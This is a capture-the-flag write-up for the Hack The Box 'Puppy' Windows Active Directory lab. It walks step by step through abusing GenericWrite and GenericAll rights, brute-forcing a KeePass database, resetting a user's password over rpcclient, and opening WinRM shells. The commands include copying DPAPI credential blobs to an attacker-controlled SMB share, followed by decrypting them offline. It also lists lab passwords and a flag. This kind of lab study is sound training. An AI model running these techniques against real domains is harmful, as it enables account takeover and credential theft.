# HTB: Puppy - Writeup

![HTB Puppy](https://labs.hackthebox.com/storage/avatars/6a127b39657062e42c1a8dfdcd23475d.png)


---

## Overview

Puppy is a Windows Active Directory box with a realistic multi-user privilege escalation chain. This writeup details the full compromise, including enumeration, abuse of AD permissions, password recovery from a KeePass database, backup file analysis, and DPAPI credential extraction.

---

## Box Information

| Attribute     | Value                  |
|---------------|------------------------|
| **Name**      | Puppy                  |
| **OS**        | Windows Server 2022    |
| **Difficulty**| Medium                 |
| **Release**   | 2025                   |
| **Creator**   | HTB Team               |

---

## Credentials Discovered

| Username              | Password                      |
|-----------------------|------------------------------|
| levi.james            | KingofAkron2025!             |
| steph.cooper          | ChefSteph2025!               |
| jamie.williamson      | JamieLove2025!               |
| adam.silver           | HJKL2025!  → V1ct0ry!Horse$678 (later reset) |
| ant.edwards           | Antman2025!                  |
| steve.tucker          | Steve2025!                   |
| samuel.blake          | ILY2025!                     |
| steph.cooper_adm      | FivethChipOnItsWay2025!      |

---

## Initial Reconnaissance

### Nmap Scan

```bash
nmap -sCTV -Pn -oA puppyhtb 10.10.11.70
```
**Key Open Ports:**
- 53/tcp (DNS)
- 88/tcp (Kerberos)
- 111/tcp (rpcbind)
- 135/tcp (msrpc)
- 139/tcp (netbios-ssn)
- 389/tcp (LDAP)
- 445/tcp (SMB)
- 464/tcp (kpasswd5)
- 593/tcp (ncacn_http)
- 2049/tcp (nlockmgr)
- 3260/tcp (iscsi)
- 3268/tcp (LDAP GC)
- 5985/tcp (WinRM)

**Host Info:**  
- Hostname: DC.PUPPY.HTB  
- Domain: PUPPY.HTB

---

## Enumerating Domain Users

Added to `/etc/hosts`:
```
10.10.11.70  DC.PUPPY.HTB  PUPPY.HTB
```

Enumerated users with valid credentials:
```bash
netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --users
```

**Domain Users Discovered:**
- Administrator
- Guest
- krbtgt
- levi.james
- ant.edwards
- adam.silver
- jamie.williams
- steph.cooper
- steph.cooper_adm

![Bloodhound User Enumeration Screenshot](file:///D:/Proton%20Drive/HTB/Puppy/addinginDEV.png)

---

## BloodHound Analysis

Using BloodHound, analyzed user privileges:

- `levi.james` is a member of `hr@puppy.htb` which has **GenericWrite** rights over `DEVELOPERS@puppy.htb`.
- Abuse of these rights allows adding a user to `DEVELOPERS`, granting access to DEV SMB share.

![Bloodhound Graph Screenshot](file:///D:/Proton%20Drive/HTB/Puppy/SMB%20FOR%20LEVI%20IN%20DEV.png)

---

## Accessing DEV Share & Recovering Files

After group abuse, accessed the DEV share via SMB and recovered two files:

```bash
file recoveredpass recovery.kdbx
# recoveredpass: ASCII text
# recovery.kdbx: Keepass password database 2.x KDBX
```

---

## Cracking the KeePass Database

Used [keepass4brute.sh](https://github.com/r3nt0n/keepass4brute) with the `rockyou.txt` wordlist:

```bash
./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
# Password found: liverpool
```

Extracted credentials (not all were domain users, but gave real names for further recon).

![KeePass Extract Screenshot](file:///D:/Proton%20Drive/HTB/Puppy/RECOVERED%20PASSWORDS%20FROM%20THE%20KEEPASS.png)

---

## Escalating with BloodHound: GenericAll Abuse

BloodHound revealed:
- `antony` (from KeePass) is a member of `seniordevs@puppy.htb`
- `seniordevs@puppy.htb` has **GenericAll** rights over `ADAM.SILVER@puppy.htb`.

![Bloodhound Path Screenshot](file:///D:/Proton%20Drive/HTB/Puppy/force%20change%20password%20using%20bloodhiund%20generic%20write%20all.png)

**Password reset for `adam.silver`:**

```bash
rpcclient -U 'puppy.htb\ant.edwards%Antman2025!' 10.10.11.70 -c "setuserinfo ADAM.SILVER 23 Password@987"
```

---

## Gaining Access as adam.silver

Verify credentials:

```bash
crackmapexec smb 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987'
crackmapexec winrm 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987' -d PUPPY.HTB
```

**Both SMB and WinRM access confirmed!**

Connect and retrieve the user flag:

```bash
evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987'
cd C:\Users\adam.silver\Desktop
type user.txt
# User Flag: b45203f370ae16d7f2e70540f2023a764
```

---

## Exploring for Further Privilege Escalation

While exploring, discovered a backup ZIP:

```powershell
cd C:\Backups
dir
# site-backup-2024-12-30.zip
download site-backup-2024-12-30.zip
unzip site-backup-2024-12-30.zip -d ./puppy
cd ./puppy
cat nms-auth-config.xml.bak
```

**LDAP Credentials Found:**
- Username: `steph.cooper`
- Password: `ChefSteph2025!`

---

## Access as steph.cooper

Check WinRM access:

```bash
crackmapexec winrm 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!' -d PUPPY.HTB
evil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'
```

---

## DPAPI Credential Harvesting

While enumerating as `steph.cooper`, found DPAPI credential blob and masterkey:

```powershell
# Credential blob:
dir C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\
# -> C8D69EBE9A43E9DEBF6B5FBD48B521B9

# DPAPI Masterkey:
dir C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\
# -> 556a2412-1275-4ccf-b721-e6a0b4f90407
```

Transferred blobs via impacket-smbserver:

```bash
impacket-smbserver share ./share -smb2support
```
On target:
```powershell
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.14.xx\share\masterkey_blob
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\10.10.14.xx\share\credential_blob
```

---

## Offline DPAPI Credential Decryption

**1. Decrypt Masterkey:**

```bash
python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
# Output: Decrypted key: 0xd9a570...
```

**2. Decrypt Credential Blob:**

```bash
python3 /usr/share/doc/python3-impacket/examples/dpapi.py credential -f credential_blob -key <decrypted_key>
```
Output:
```
Username : steph.cooper_adm
Password : FivethChipOnItsWay2025!
```

---

## Final Privilege Escalation: Domain Admin

With the credentials for `steph.cooper_adm`, further escalation or domain compromise is possible (not shown here).

---

## Attack Chain Summary

```
levi.james (initial access)
    ↓ GenericWrite abuse
Access to DEV share
    ↓
KeePass recovery → antony (seniordevs)
    ↓
GenericAll over adam.silver → password reset
    ↓
adam.silver → backup ZIP → steph.cooper
    ↓
steph.cooper → DPAPI blobs → steph.cooper_adm
    ↓
[Potential Domain Admin]
```

---

## Key Techniques Used

1. **Active Directory Enumeration** — BloodHound, netexec
2. **SMB/WinRM Abuse** — Lateral movement, privilege testing
3. **KeePass Cracking** — keepass4brute with rockyou
4. **AD Permission Abuse** — GenericWrite & GenericAll attacks
5. **Backup Analysis** — Extraction of plaintext credentials
6. **DPAPI Credential Extraction** — Offline decryption for further escalation

---

## Tools Used

- `nmap` — Service enumeration
- `netexec` — SMB/WinRM/user enumeration
- `BloodHound` — AD graph analysis
- `keepass4brute.sh` — KeePass brute-force
- `rpcclient` — Password abuse
- `crackmapexec` — Access validation
- `evil-winrm` — Shell access
- `impacket-smbserver` — File transfer
- `impacket dpapi.py` — DPAPI blob decryption

---

## Pwned

[THE HTB PUPPY BOX](https://www.hackthebox.com/achievement/machine/1390647/661)

**Author:** 0xdf-sec  
**Date:** June 2, 2025  
**Tags:** `hackthebox` `active-directory` `bloodhound` `keepass` `dpapi` `windows-pentesting`
